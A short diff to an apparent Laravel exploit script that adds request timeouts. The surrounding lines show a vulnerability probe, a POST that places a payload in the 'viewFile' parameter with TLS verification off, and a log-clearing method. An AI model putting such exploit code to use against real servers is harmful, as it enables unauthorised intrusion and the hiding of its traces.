@@ -13,7 +13,7 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class EXP:
     def __vul_check(self):
-        res = requests.get(self.__url,verify=False)
+        res = requests.get(self.__url,verify=False, timeout=5)
         if res.status_code != 405 and "laravel" not in res.text:
             print("[+]Vulnerability does not exist")
             return False
@@ -34,7 +34,7 @@ class EXP:
         data["parameters"]["viewFile"] = payload
 
         #print(data)
-        res = requests.post(self.__url, headers=header, json=data, verify=False)
+        res = requests.post(self.__url, headers=header, json=data, verify=False, timeout=5)
         return res
 
     def __clear_log(self):
